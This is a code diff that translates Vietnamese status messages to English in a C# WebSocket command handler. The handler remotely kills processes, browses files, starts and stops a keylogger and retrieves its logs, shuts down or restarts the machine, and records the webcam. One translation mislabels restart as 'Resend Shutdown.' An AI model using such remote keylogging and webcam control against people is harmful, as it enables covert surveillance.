@@ -48,7 +48,7 @@ namespace WebSocketTest.Core
                         return _processService.GetFullProcessList();
                     case "killProcess":
                         if (int.TryParse(arg, out int pid)) return _processService.KillProcessByPid(pid);
-                        return JsonResponse.Error("PID phải là số");
+                        return JsonResponse.Error("PID must be a number");
 
                     // ===== FILE MANAGER =====
                     case "list_dir":
@@ -87,7 +87,7 @@ namespace WebSocketTest.Core
                     // ===== KEYLOGGER =====
                     case "keylog_start":
                         KeyLoggerService.Start();
-                        return JsonResponse.Success("Đã bắt đầu ghi phím (Keylogger Started).");
+                        return JsonResponse.Success("Keylogger Started.");
                     case "keylog_stop":
                         KeyLoggerService.Stop();
                         string logs = KeyLoggerService.GetLogs();
@@ -98,27 +98,27 @@ namespace WebSocketTest.Core
                     // ===== POWER =====
                     case "shutdown":
                         ShutdownRestart.Shutdown();
-                        return JsonResponse.Success("Lệnh tắt máy đã được gửi.");
+                        return JsonResponse.Success("Send Shutdown.");
                     case "restart":
                         ShutdownRestart.Restart();
-                        return JsonResponse.Success("Lệnh khởi động lại đã được gửi.");
+                        return JsonResponse.Success("Resend Shutdown.");
 
                     // ===== WEBCAM (NEW IMPLEMENTATION) =====
                     case "start_cam":                        
                         if (!int.TryParse(arg, out int duration) || duration < 5 || duration > 300)
                         {
-                            return JsonResponse.Error("Duration phải từ 5-300 giây");
+                            return JsonResponse.Error("Duration between 5-300s");
                         }                        
                         _ = Task.Run(async () =>
                         {
                             try
                             {
-                                await _sendAsync(JsonResponse.Info($"Đang khởi động camera ({duration}s)..."));
+                                await _sendAsync(JsonResponse.Info($"Starting camera ({duration}s)..."));
                                 await _webcamService.StartRecordingAsync(_sendAsync, duration);
                             }
                             catch (Exception ex)
                             {
-                                await _sendAsync(JsonResponse.Error("Lỗi camera: " + ex.Message));
+                                await _sendAsync(JsonResponse.Error("Camera Error: " + ex.Message));
                             }
                         });
                         return JsonResponse.Info("Starting camera...");
@@ -138,7 +138,7 @@ namespace WebSocketTest.Core
             }
             catch (Exception ex) 
             { 
-                return JsonResponse.Error("Lỗi Server: " + ex.Message); 
+                return JsonResponse.Error("Server Error: " + ex.Message); 
             }
         }
     }
